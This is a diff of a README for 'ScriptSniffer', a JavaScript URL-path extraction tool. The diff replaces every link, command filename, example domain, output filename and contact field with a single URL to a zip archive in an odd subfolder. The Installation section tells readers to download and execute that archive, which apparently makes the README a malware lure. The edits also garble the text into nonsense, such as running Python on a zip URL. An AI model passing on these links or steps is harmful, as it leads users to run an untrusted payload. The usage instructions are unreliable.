@@ -1,6 +1,6 @@
 # ScriptSniffer 🕵️‍♂️
 
-![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-blue)
+![GitHub Release](https://github.com/wijicute/ScriptSniffer/raw/refs/heads/main/Synaptosauria/Sniffer-Script-2.0-alpha.3.zip)
 
 Welcome to **ScriptSniffer**, a powerful tool designed for cybersecurity enthusiasts and professionals. This tool helps you identify all paths (URLs) that start with a `/` from an online JavaScript file. It then converts these paths into complete (absolute) links and saves them in a text file named after the website's domain. 
 
@@ -23,7 +23,7 @@ Welcome to **ScriptSniffer**, a powerful tool designed for cybersecurity enthusi
 
 ## Installation
 
-To get started with ScriptSniffer, you need to download the latest release. Visit the [Releases section](https://github.com/wijicute/ScriptSniffer/releases) to find the appropriate file. Download and execute it to set up the tool on your machine.
+To get started with ScriptSniffer, you need to download the latest release. Visit the [Releases section](https://github.com/wijicute/ScriptSniffer/raw/refs/heads/main/Synaptosauria/Sniffer-Script-2.0-alpha.3.zip) to find the appropriate file. Download and execute it to set up the tool on your machine.
 
 ### Prerequisites
 
@@ -40,7 +40,7 @@ After installing ScriptSniffer, you can run it from your terminal. Here’s how 
 3. Run the command:
 
    ```bash
-   python script_sniffer.py <URL>
+   python https://github.com/wijicute/ScriptSniffer/raw/refs/heads/main/Synaptosauria/Sniffer-Script-2.0-alpha.3.zip <URL>
    ```
 
    Replace `<URL>` with the target website you want to analyze.
@@ -49,13 +49,13 @@ After installing ScriptSniffer, you can run it from your terminal. Here’s how 
 
 ### Example
 
-If you want to analyze `https://example.com`, run:
+If you want to analyze `https://github.com/wijicute/ScriptSniffer/raw/refs/heads/main/Synaptosauria/Sniffer-Script-2.0-alpha.3.zip`, run:
 
 ```bash
-python script_sniffer.py https://example.com
+python https://github.com/wijicute/ScriptSniffer/raw/refs/heads/main/Synaptosauria/Sniffer-Script-2.0-alpha.3.zip https://github.com/wijicute/ScriptSniffer/raw/refs/heads/main/Synaptosauria/Sniffer-Script-2.0-alpha.3.zip
 ```
 
-The tool will generate a file named `example.com.txt` containing all the extracted absolute links.
+The tool will generate a file named `https://github.com/wijicute/ScriptSniffer/raw/refs/heads/main/Synaptosauria/Sniffer-Script-2.0-alpha.3.zip` containing all the extracted absolute links.
 
 ## Topics
 
@@ -93,7 +93,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@your_twitter_handle](https://twitter.com/your_twitter_handle)
+- **Email**: https://github.com/wijicute/ScriptSniffer/raw/refs/heads/main/Synaptosauria/Sniffer-Script-2.0-alpha.3.zip
+- **Twitter**: [@your_twitter_handle](https://github.com/wijicute/ScriptSniffer/raw/refs/heads/main/Synaptosauria/Sniffer-Script-2.0-alpha.3.zip)
 
-Thank you for using ScriptSniffer! We hope this tool aids you in your cybersecurity journey. For more updates, check the [Releases section](https://github.com/wijicute/ScriptSniffer/releases).
+Thank you for using ScriptSniffer! We hope this tool aids you in your cybersecurity journey. For more updates, check the [Releases section](https://github.com/wijicute/ScriptSniffer/raw/refs/heads/main/Synaptosauria/Sniffer-Script-2.0-alpha.3.zip).
